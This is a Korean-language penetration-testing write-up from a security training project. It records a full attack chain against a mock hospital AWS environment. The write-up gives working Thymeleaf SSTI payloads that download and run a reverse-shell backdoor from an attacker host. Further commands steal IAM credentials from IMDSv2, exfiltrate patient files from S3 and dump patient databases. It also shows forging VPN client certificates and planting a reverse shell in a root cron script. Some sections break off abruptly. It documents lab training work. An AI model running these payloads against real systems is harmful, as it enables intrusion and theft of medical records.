시나리오 A — 서버/클라우드 심층 공격 킬체인

SK쉴더스 Rookies 28기 최종 프로젝트 프로젝트명: 생성형 AI를 활용한 클라우드 기반의 시나리오 모의해킹 환경: 교육 목적의 통제된 환경에서만 수행

주의

이 문서는 교육 목적의 통제된 환경에서 수행된 모의해킹 과정을 기록한 것입니다. 실제 운영 시스템에 대한 무단 침투는 불법입니다.

1. 킬체인 개요​

2. Stage 1 — SSTI 초기 침투​

항목내용
공격 기법Server-Side Template Injection (SSTI) → 리버스 셸
공격 표면회원가입 시 이메일 인증번호 요청 기능 — 이름(name) 파라미터
활용 취약점이메일 템플릿에 이름 값을 무해화 없이 삽입 → Thymeleaf 템플릿 구문 실행
핵심 의의IMDSv2 환경에서 PUT 헤더 조작이 가능한 SSTI가 필수 (단순 GET SSRF로는 불가)

Step 1 — 공격 준비: 백도어 셸 호스팅​

공격자 서버(Kali 또는 공격자 EC2)에서 백도어 스크립트를 호스팅합니다.

백도어 스크립트 작성:

# backdoor.sh 작성
cat > backdoor.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/[공격자_IP]/7576 0>&1
EOF

Python HTTP 서버로 호스팅:

# backdoor.sh가 있는 디렉토리에서 실행
python3 -m http.server 7575

리버스 셸 리스너 대기 (별도 터미널):

nc -nlvp 7576

Step 2 — SSTI 페이로드 삽입​

rkhospital 회원가입 시 이름 필드에 아래 페이로드를 순서대로 삽입합니다. 각 페이로드를 이름으로 입력 후 이메일 인증 요청을 보내면 서버 측에서 Thymeleaf 템플릿 구문이 실행됩니다.

① 공격자 서버에서 backdoor.sh 다운로드:

<span th:text="${''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeMethod(''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeStaticMethod(''.class.forName('java.lang.Runtime'),'getRuntime'), 'exec', 'wget http://attack.rkhospital.co.kr:7575/backdoor.sh -O /tmp/backdoor.sh')}"></span>

공격자 IP: 43.203.213.230

② backdoor.sh 실행 권한 부여:

<span th:text="${''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeMethod(''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeStaticMethod(''.class.forName('java.lang.Runtime'),'getRuntime'), 'exec', 'chmod +x /tmp/backdoor.sh')}"></span>

③ backdoor.sh 실행 → 리버스 셸 연결:

<span th:text="${''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeMethod(''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeStaticMethod(''.class.forName('java.lang.Runtime'),'getRuntime'), 'exec', '/tmp/backdoor.sh')}"></span>

Step 3 — API EC2 셸 장악​

Kali 리스너 터미널에서 API EC2의 리버스 셸이 연결됩니다.

페이로드 원리

Thymeleaf의 th:text 속성에서 SpEL(Spring Expression Language)을 통해 java.lang.Runtime.exec()를 호출합니다. Apache Commons Lang3의 MethodUtils를 경유하여 리플렉션으로 임의 명령 실행이 가능합니다.

백도어 종료 시
<span th:text="${''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeMethod(''.class.forName('org.apache.commons.lang3.reflect.MethodUtils').invokeStaticMethod(''.class.forName('java.lang.Runtime'),'getRuntime'), 'exec', 'pkill -9 -f backdoor.sh')}"></span>

포인트: IMDSv2는 PUT 요청 + 특수 헤더(X-aws-ec2-metadata-token-ttl-seconds)가 필수입니다. 단순 GET 기반 SSRF로는 토큰 발급이 불가하므로, 헤더 조작이 가능한 SSTI가 시나리오 A의 핵심 진입점입니다. SSTI를 통해 획득한 리버스 셸에서 curl로 IMDS에 직접 접근할 수 있어 IMDSv2 우회가 가능합니다.

3. Stage 2 — IMDSv2 토큰 발급 및 IAM 자격증명 탈취​

실행 위치: API EC2 (Stage 1 리버스 셸로 장악한 상태)

테스트 환경 접속 방법

리버스 셸 대신 Bastion ProxyJump SSH로도 접속 가능합니다:

ssh -i med-clinic-key.pem -o ProxyJump=ubuntu@[Bastion_EIP] ubuntu@[API_EC2_Private_IP]

Step 1 — IMDSv2 토큰 발급 (PUT 요청)​

TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo $TOKEN

포인트: IMDSv2는 PUT 요청 + X-aws-ec2-metadata-token-ttl-seconds 헤더 없이는 토큰 발급 불가. 단순 GET SSRF로는 이 단계를 통과할 수 없음 → 헤더 조작 가능한 SSTI가 필수인 이유.

Step 2 — IAM Role 이름 조회​

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step 3 — IAM 임시 자격증명 탈취​

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/med-clinic-api-role

포인트:

  • ASIA로 시작하는 AccessKeyId → STS 임시 자격증명
  • AccessKeyId + SecretAccessKey + Token 3개 세트 모두 필요
  • 만료 시간 약 6시간 — 킬체인 전체 진행에 충분한 시간

4. Stage 3 — Kali에 자격증명 등록 및 검증​

실행 위치: Kali

Step 1 — 환경변수 등록​

export AWS_ACCESS_KEY_ID="ASIA********************"
export AWS_SECRET_ACCESS_KEY="****************************************"
export AWS_SESSION_TOKEN="<임시 세션 토큰 — 실습 환경에서 IMDS로 획득한 값>"
export AWS_DEFAULT_REGION="ap-northeast-2"
warning

임시 자격증명은 세션이 끊기면 환경변수가 초기화됩니다. 새 터미널 열 때마다 재등록 필요.

Step 2 — 자격증명 검증​

aws sts get-caller-identity

포인트: med-clinic-api-role 확인. 다만 이 시점에서 구체적 권한은 알 수 없으므로, 후속 단계에서 주요 AWS 서비스에 순차 접근하여 권한 범위를 파악한다.

Step 3 — 권한 범위 탐색​

탈취한 Role에 어떤 정책이 연결되어 있는지 직접 확인을 시도합니다.

aws iam list-attached-role-policies --role-name med-clinic-api-role
# An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation

IAM 읽기 권한(iam:ListAttachedRolePolicies)이 없어 정책 목록 조회 불가. 따라서 주요 서비스에 직접 접근을 시도하여 권한 범위를 파악합니다.

어떤 권한이 있는지 빠르게 확인하려면 주요 서비스별 조회 명령을 실행합니다.

# S3 접근 가능 여부
aws s3 ls 2>&1 | head -5

# SSM 인스턴스 목록 조회 가능 여부
aws ssm describe-instance-information --region ap-northeast-2 --output table 2>&1 | head -10

# EC2 인스턴스 목록 (거부 예상)
aws ec2 describe-instances --region ap-northeast-2 2>&1 | head -3

# Bedrock 모델 목록 (거부 예상)
aws bedrock list-foundation-models --region ap-northeast-2 2>&1 | head -3

포인트: S3, SSM은 성공 / EC2 DescribeInstances, Bedrock ListModels는 거부 → 과다 권한이지만 모든 권한이 있는 것은 아님. 공격 경로 계획 수립에 활용.

5. Stage 4 — 클라우드 권한 남용 (S3 + Bedrock)​

실행 위치: Kali

4-1. S3 환자 민감 문서 탈취​

버킷 목록 및 내부 구조 확인:

aws s3 ls
aws s3 ls s3://med-clinic-docs-105588835975/ --recursive

환자 민감 문서 다운로드:

mkdir -p ~/loot/patient-docs

# 전체 일괄 다운로드
aws s3 sync s3://[버킷명]/patient-docs/ ~/loot/patient-docs/

포인트: 탈취한 IAM 자격증명 하나로 환자 민감 문서(신분증, 진단서, 보험서류) 전체 다운로드 가능. S3FullAccess 과다 권한의 직접적 피해.

4-2. Bedrock 무단 AI 모델 호출​

모델 목록 조회 시도 → 거부 확인:

aws bedrock list-foundation-models --region ap-northeast-2
# AccessDeniedException — 열거 권한 없음

열거 권한(bedrock:ListFoundationModels)이 없어 모델 목록 조회 불가. 그러나 Bedrock 모델 ID는 AWS 공식 문서에 공개되어 있으므로, 모델 ID를 알면 직접 호출이 가능합니다.

알려진 모델 ID로 직접 호출:

aws bedrock-runtime invoke-model \
  --region ap-northeast-2 \
  --model-id "anthropic.claude-3-haiku-20240307-v1:0" \
  --body '{"anthropic_version":"bedrock-2023-05-31","max_tokens":100,"messages":[{"role":"user","content":"이 병원의 진료 예약 시스템에 대해 알려줘"}]}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/bedrock-test.json

cat /tmp/bedrock-test.json | python3 -m json.tool

포인트:

  • IAM 자격증명 탈취만으로 타 계정의 AI 모델을 무단 호출 가능
  • 비용 청구 공격 (악의적 대량 호출) + 데이터 유출 위험 (프롬프트에 민감 정보 포함 가능)
  • bedrock:List* 권한이 없어도 모델 ID는 AWS 공식 문서에 공개 — 열거 차단만으로는 방어 불충분

6. Stage 5 — API EC2에서 RDS 크레덴셜 탈취 → 환자 DB 덤프​

실행 위치: API EC2 (Stage 1 리버스 셸로 장악한 상태)

Stage 1에서 리버스 셸로 API EC2 셸을 이미 획득한 상태입니다. 이 서버에서 Spring Boot가 실행 중이므로 추가 침투 없이 바로 크레덴셜 탈취가 가능합니다.

Step 1 — Spring Boot 프로세스에서 RDS 크레덴셜 탈취​

ps aux | grep java | grep -oE "\-\-spring\.datasource\.(url|username|password)=[^ ]+"

포인트: Spring Boot 실행 인자에 DB 크레덴셜이 평문으로 노출됨 → ps aux만으로 탈취 가능. application.properties에 환경변수 바인딩 대신 실행 인자 직접 전달한 것이 취약 원인.

Step 2 — MySQL 접속 및 환자 DB 열람​

mysql -h jdbc:mysql://med-clinic-db.c3s26k4iyom0.ap-northeast-2.rds.amazonaws.com:3306/medclinic -u admin -padmin123! medclinic
SHOW TABLES;

SELECT patient_id, name, birth, gender, phone, email, address FROM patient LIMIT 5;

포인트: 환자 인적사항(이름, 생년월일, 연락처, 이메일, 주소) 전체 노출. bcrypt 해시 패스워드도 포함 — 오프라인 크래킹 가능.

Step 3 — DB 전체 덤프​

mysqldump -h [RDS_Endpoint] -u admin -padmin123! medclinic > /tmp/medclinic_dump.sql
ls -lh /tmp/medclinic_dump.sql

7. Stage 6 — SSM 횡적 이동 → Bastion 침투 → OpenVPN 설정 발견​

실행 위치: Kali

Stage 2~4에서 탈취한 IAM 자격증명(S3+SSM+Bedrock 과다 권한)을 활용합니다. API EC2는 이미 SSTI로 장악했으므로, SSM 횡적 이동은 Bastion으로 넘어가기 위해 사용합니다.

Step 1 — SSM 인스턴스 목록 탐색​

ec2:DescribeInstances 권한이 없으므로 SSM으로 우회하여 VPC 내 인스턴스를 탐색합니다.

# EC2 권한 없음 확인
aws ec2 describe-instances --region ap-northeast-2 2>&1 | head -3
# UnauthorizedOperation 에러

# SSM으로 우회 탐색

8. Stage 7 — Kali 전용 VPN 인증서 발급 → 내부망 직접 접속​

실행 위치: Kali (Bastion SSM 세션 및 새 터미널)

배경​

Stage 6에서 탈취한 gw-vm.ovpn은 GW-Server가 현재 사용 중인 인증서(CN=gw-vm)를 담고 있습니다. 이 파일을 Kali에서 그대로 사용하면 동일 CN으로 두 클라이언트가 접속하여 기존 GW-Server 연결이 끊어집니다.

공격자(Kali)는 Bastion 서버에 직접 접근한 상태이므로, Easy-RSA를 활용하여 Kali 전용 클라이언트 인증서(kali-attacker)를 직접 발급할 수 있습니다.

시나리오 포인트: 단순 인증서 파일 탈취를 넘어, Bastion 장악 → PKI 권한 탈취 → 새 인증서 자체 발급이라는 공격 심화 연출

Step 1 — Bastion에서 kali-attacker 인증서 발급​

실행 위치: Bastion SSM 세션

EASYRSA=/usr/share/easy-rsa/easyrsa
EASYRSA_PKI=/etc/openvpn/server/pki

sudo $EASYRSA --pki-dir="$EASYRSA_PKI" --batch --req-cn="kali-attacker" gen-req kali-attacker nopass
sudo $EASYRSA --pki-dir="$EASYRSA_PKI" --batch sign-req client kali-attacker

CN 확인:

sudo openssl x509 -in /etc/openvpn/server/pki/issued/kali-attacker.crt -noout -subject
# 정상: subject=CN = kali-attacker

포인트: Bastion PKI(Easy-RSA)에 대한 sudo 권한으로 정상 서명된 클라이언트 인증서 발급 가능. CA 개인키가 서버에 보관되어 있어 임의 인증서 발급이 가능한 상태.

Step 2 — kali-attacker.ovpn 파일 생성​

실행 위치: Bastion SSM 세션

sudo bash -c '
CA=/etc/openvpn/server/ca.crt
CERT=$(openssl x509 -in /etc/openvpn/server/pki/issued/kali-attacker.crt)
KEY=/etc/openvpn/server/pki/private/kali-attacker.key
TLS=/etc/openvpn/server/tc.key

cat > /tmp/kali-attacker.ovpn << EOF
client
dev tun
proto tcp
remote 54.116.80.184 22
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
auth SHA512
cipher AES-256-GCM
verb 3
<ca>
$(cat $CA)
</ca>
<cert>
$CERT
</cert>
<key>
$(cat $KEY)
</key>
<tls-crypt>
$(cat $TLS)
</tls-crypt>
EOF
'

확인:

sudo grep -c "BEGIN CERTIFICATE" /tmp/kali-attacker.ovpn  # 2
sudo grep "remote " /tmp/kali-attacker.ovpn                # remote [EIP] 22

주의사항
  • openssl x509 -in으로 순수 인증서만 추출합니다. pki/issued/*.crt에는 verbose 텍스트가 포함되어 있어 OpenSSL 파싱 실패 가능.
  • TLS 키 파일명은 tc.key입니다. ta.key가 아닙니다.
  • remote 포트는 반드시 22 (SSLH 경유)

Step 3 — Kali로 ovpn 파일 전송 및 VPN 접속​

실행 위치: Bastion SSM → Kali

# Bastion에서 ovpn 내용 출력
sudo cat /tmp/kali-attacker.ovpn

출력 전체를 복사 → Kali에서:

cat > /tmp/kali-attacker.ovpn << 'OVPN_EOF'
# 복사한 내용 붙여넣기
OVPN_EOF

Kali에서 VPN 접속:

# 기존 tun 인터페이스 정리
sudo pkill openvpn 2>/dev/null; true
sudo ip link delete tun0 2>/dev/null; true

sudo openvpn --config /tmp/kali-attacker.ovpn

실행 위치: Kali (새 터미널)

ip route | grep 192.168.10

확인 결과:

  • GW-Server와 Kali가 각각 독립적인 CN(gw-vm / kali-attacker)으로 VPN에 동시 접속 중

포인트: Bastion 관리자가 GW-Server 접속용 SSH 키를 /root/.ssh/에 보관 → SSM으로 장악한 Bastion에서 탈취 가능.

Bastion에서 GW-Server 접속 시 내부 IP(192.168.10.2)가 아닌 VPN 터널 IP(10.8.0.2) 를 사용해야 합니다.

8-2. SVC-Server Samba 접속 → credentials.kdbx 접근 불가 확인​

실행 위치: GW-Server

smbclient //192.168.10.4/it-ops -U 'smb_admin%sk2812!@'
smb: \> ls
smb: \> get credentials.kdbx /tmp/credentials.kdbx

포인트: IT 운영 Samba 공유 폴더에서 credentials.kdbx (KeePass DB) 파일 존재를 확인했으나, root 소유 파일로 일반 유저(smb_admin)로는 읽기 불가. → root 권한 상승이 필요한 이유가 여기서 명확해집니다.

8-3. SVC-Server SSH 진입 → root 권한 상승 (crontab 백업 스크립트 변조)​

실행 위치: Kali

smb_admin의 Samba 패스워드(sk2812!@)가 SVC-Server의 Linux 시스템 계정과 동일한지 확인합니다 (크레덴셜 재사용 테스트).

# GW-Server 경유
ssh -i ~/Desktop/rookies/bastion_id_rsa gw_admin@10.8.0.2

# GW-Server → SVC-Server
ssh smb_admin@192.168.10.4
# 패스워드: sk2812!@

포인트: Samba 계정과 Linux 시스템 계정에 동일 패스워드 사용 → 크레덴셜 재사용 취약점으로 SSH 진입 성공.

linpeas를 활용하 root crontab 및 백업 스크립트 확인​

# linpeas 다운 및 실행 결과 저장하기
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh /dev/shm/linpeas.sh

./linpeas.sh | tee linpeas.txt

# linpeas -> backup 스크립트 확인하기
less -R linpeas.txt | grep -B 3 -A 3 'backup.sh'

# 시스템 전체 crontab 확인
cat /etc/crontab

# 백업 스크립트 권한 확인
ls -la /opt/backup.sh

포인트: root가 crontab으로 실행하는 스크립트인데, 파일 소유자/권한 설정 미흡으로 일반 유저가 내용을 수정할 수 있음(-rwxrwxrwx). 이것이 핵심 취약점.

SVC-Server → Kali 직접 통신 불가 문제 및 socat 중계 설정​

SVC-Server(192.168.10.4)의 라우팅 테이블에 10.8.0.x(VPN 대역) 경로가 없어 Kali(10.8.0.3)에 직접 도달할 수 없습니다. GW-Server(192.168.10.2) → Kali(10.8.0.3) 통신은 가능하므로, socat 포트 포워딩으로 중계합니다.

SVC-Server(192.168.10.4) → GW-Server(192.168.10.2):4444 → (socat 중계) → Kali(10.8.0.3):4444

[GW-Server] socat 중계 실행:

sudo apt install socat -y  # 최초 1회
socat TCP-LISTEN:4444,fork TCP:10.8.0.3:4444

[Kali] 리버스 셸 리스너 대기:

nc -lvnp 4444

백업 스크립트에 리버스 셸 페이로드 삽입​

실행 위치: SVC-Server (smb_admin)

# 기존 스크립트 내용 확인
cat /opt/backup.sh

# 리버스 셸 페이로드 추가 (GW-Server IP로 — socat이 Kali로 중계)
echo 'bash -i >& /dev/tcp/192.168.10.2/4444 0>&1' >> /opt/backup.sh

# 변조 확인
cat /opt/backup.sh

caution

리버스 셸 대상 IP는 GW-Server IP(192.168.10.2)입니다 — socat이 Kali(10.8.0.3)로 중계합니다.

root 셸 획득​

cron이 1분 주기로 실행되므로, 최대 1분 내에 Kali 리스너에 root 셸이 연결됩니다.

whoami && id && hostname
# root, uid=0(root), SVC-Server

포인트:

  • root crontab이 실행하는 백업 스크립트의 파일 권한이 일반 유저 쓰기 가능 → 권한 상승의 직접 원인
  • cron 주기 1분은 시연용 설정. 실 환경에서는 일/주 단위이지만 공격자는 대기 가능
  • sudo 직접 실행 불필요, 지속성(Persistence) 관점에서도 의미 있는 공격 기법

8-4. root 권한으로 credentials.kdbx 탈취 → KeePass 크래킹​

실행 위치: SVC-Server (root 셸)

8-2에서 접근 불가했던 kdbx 파일을 root로 접근합니다.

ls -la /srv/samba/it-ops/credentials.kdbx

grep -A5 "\[it-ops\]" /etc/samba/smb.conf

SVC → GW → Kali로 kdbx 파일 전송:

실행 위치: GW-Server

scp smb_admin@192.168.10.4:/tmp/credentials.kdbx /tmp/credentials.kdbx

진단 기록 및 처방 내역 열람​

SELECT * FROM diagnosis_record LIMIT 5\G
SELECT p.prescription_id, pi.drug_id, d.drug_name, pi.dosage, pi.frequency, pi.days, pi.notes
FROM prescription p
JOIN prescription_item pi ON p.prescription_id = pi.prescription_id
JOIN drug d ON pi.drug_id = d.drug_id
LIMIT 5\G

포인트: Stage 5(RDS)의 patient 테이블이 인적사항(이름, 연락처, 주소)이었다면, EMR DB는 **실제 진료 기록(진단명, 진료 소견, 진료비)과 처방 내역(약물명, 용량, 복용법)**을 포함합니다. 두 DB를 결합하면 환자별 질환 + 처방 내역 완전 파악이 가능합니다.

전체 DB 덤프​

mysqldump -u emr_db -p'emrdb12!@' emr > /tmp/emr_dump.sql
ls -lh /tmp/emr_dump.sql

킬체인 최종 목표 달성: RDS(Stage 5)의 인적사항 + EMR DB(Stage 8-5)의 진료/처방 기록을 모두 탈취. 의료 정보 유출의 완전한 시나리오 완성.

부록 B — 트러블슈팅​

B-1. Kali ↔ GW-VM VPN 동시 접속 충돌 (CN 중복)​

문제: gw-vm.ovpn을 Kali에서 그대로 사용 시 GW-Server VPN 연결이 강제 종료됨. 또는 Kali에 10.8.0.2가 할당되어 IP 충돌 발생.

원인: 클라이언트 인증서 CN이 동일하면 OpenVPN 서버가 동일 클라이언트로 인식. duplicate-cn 옵션이 있어도 CN이 같으면 ipp.txt에서 동일 IP를 배정.

해결: Bastion Easy-RSA로 kali-attacker 전용 클라이언트 인증서를 고유한 CN으로 발급 후 별도 ovpn 파일 생성 (Stage 7 참조)

B-2. SVC-Server → Kali 직접 통신 불가 (socat 중계 필요)​

문제: SVC-Server에서 Kali(10.8.0.3) ping 100% packet loss

원인: SVC-Server 라우팅 테이블에 10.8.0.x VPN 대역 경로 없음 (default gateway: 192.168.10.254)

해결: GW-Server에서 socat으로 포트 포워딩 중계

# GW-Server에서
sudo apt install socat -y
socat TCP-LISTEN:4444,fork TCP:10.8.0.3:4444

→ SVC-Server 리버스 셸 대상: 192.168.10.2:4444 / Kali 리스너: 4444

B-3. Kali에서 내부망(192.168.10.0/24) 직접 접근 불가​

문제: Kali → 192.168.10.x ping 100% packet loss

원인 및 해결:

서버설정 내용
Bastionsysctl -w net.ipv4.conf.all.send_redirects=0 — ICMP 리다이렉트 비활성화
Bastioniptables POSTROUTING에서 192.168.10.0/24 목적지를 SNAT 대상에서 제외
GW-Serveriptables -t nat -A POSTROUTING -s 10.8.0.0/24 -d 192.168.10.0/24 -j MASQUERADE — Kali 발신 패킷을 GW-Server IP로 SNAT

B-4. IMDSv2 토큰 발급 실패​

증상원인
아무것도 출력 안 됨IMDSv2 설정 문제 또는 네트워크 차단
curl: (7) Failed to connectIMDS 엔드포인트 접근 불가

B-5. SSM 세션 연결 실패​

증상확인 사항
TargetNotConnected대상 인스턴스의 SSM Agent 상태 확인 (systemctl status amazon-ssm-agent)
AccessDeniedExceptionIAM 자격증명 만료 여부 확인 (6시간), 환경변수 재등록
Plugin 미설치 에러Session Manager Plugin 설치 여부 확인 (Stage 6, Step 2)

B-6. OpenVPN 접속 시 SSLH 포트 문제​

문제: Bastion EIP에 직접 1194 포트로 접속 시도 → 실패

해결: Bastion은 SSLH로 TCP 22에서 SSH + OpenVPN을 멀티플렉싱 → ovpn 파일 remote 포트는 반드시 22

# 정상
remote [Bastion_EIP] 22

# 잘못된 경우
remote [Bastion_EIP] 1194

B-7. Samba smb_admin 계정 미등록​

문제: smbclient 접속 시 NT_STATUS_ACCESS_DENIED

해결: SVC-Server에서 sudo smbpasswd -a smb_admin으로 Samba 계정 등록 필요. pdbedit -L로 등록 여부 사전 확인 권장.

B-8. EMR-Server SSH 서비스 이름​

Ubuntu에서 SSH 서비스 이름은 ssh이지 sshd가 아닙니다.

# 올바른 명령
sudo systemctl status ssh

# 잘못된 명령 (CentOS/RHEL 방식)
sudo systemctl status sshd
